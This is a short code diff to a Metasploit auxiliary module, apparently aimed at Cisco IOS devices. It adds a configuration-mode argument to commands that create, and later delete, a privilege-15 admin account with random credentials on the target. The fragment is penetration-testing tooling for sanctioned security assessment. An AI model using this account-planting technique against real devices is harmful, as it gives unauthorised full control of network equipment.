@@ -100,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
       admin_username = Rex::Text.rand_text_alpha(8)
       admin_password = Rex::Text.rand_text_alpha(8)
 
-      unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}")
+      unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}", Mode::GLOBAL_CONFIGURATION)
         print_error('Failed to create admin user')
         return
       end
@@ -112,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
       ensure
         vprint_status("Removing user '#{admin_username}'")
 
-        unless run_cli_command("no username #{admin_username}")
+        unless run_cli_command("no username #{admin_username}", Mode::GLOBAL_CONFIGURATION)
           print_warning('Failed to remove user')
         end
       end
